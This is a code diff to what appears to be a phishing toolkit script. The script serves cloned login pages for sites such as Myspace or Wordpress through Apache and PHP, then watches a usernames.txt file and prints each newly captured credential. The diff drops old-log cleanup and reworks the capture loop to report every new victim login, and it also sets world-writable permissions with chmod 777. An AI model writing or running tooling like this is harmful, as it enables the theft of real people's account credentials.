@@ -43,21 +43,7 @@ print("[10] Myspace             [20] Wordpress")
 web_num = input("\nPlease enter a number: ")
 website = sites[web_num]
 
-# Remove log files if they have been previously saved
-if os.path.exists("/phish/sites/{}/usernames.txt"):
-    print("Removing old usernames.txt file...")
-    path = "/phish/sites/{}/usernames.txt".format(website)
-    os.remove(path)
-    time.sleep(0.5)
-
-if os.path.exists("/phish/sites/{}/ip.txt".format(website)):
-    print("Removing old ip.txt file...")
-    path = "/phish/sites/{}/ip.txt".format(website)
-    os.remove(path)
-    time.sleep(0.5)
-
-print("\n")
-print("Setting up DocumentRoot for apache...")
+print("\nSetting up DocumentRoot for apache...")
 os.system(
     "sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(
         website
@@ -66,14 +52,8 @@ os.system(
 time.sleep(1)
 
 print("Starting php server...")
-os.system(
-    "chmod 777 /phish/sites/{}".format(website)
-)  # Add permissions for the php files
-os.system(
-    "cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(
-        website
-    )
-)
+os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files
+os.system("cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(website))
 
 print("Starting web server...\n")
 os.system("httpd 2> /dev/null")
@@ -82,9 +62,11 @@ time.sleep(2)
 print("Open 'localhost:3333' on your local machine.\n")
 
 print("Waiting for credentials...")
+count = 0
 while 1:
     if os.path.exists("/phish/sites/{}/usernames.txt".format(website)):
-        creds = open("/phish/sites/{}/usernames.txt".format(website)).read()
-        print(creds)
-        break
-    time.sleep(1)
+        creds = open("/phish/sites/{}/usernames.txt".format(website)).read().split("\n")
+        if (count < len(creds)):
+            print("New credentials captured: " + creds[count - 1])
+            count += 1
+    time.sleep(3)
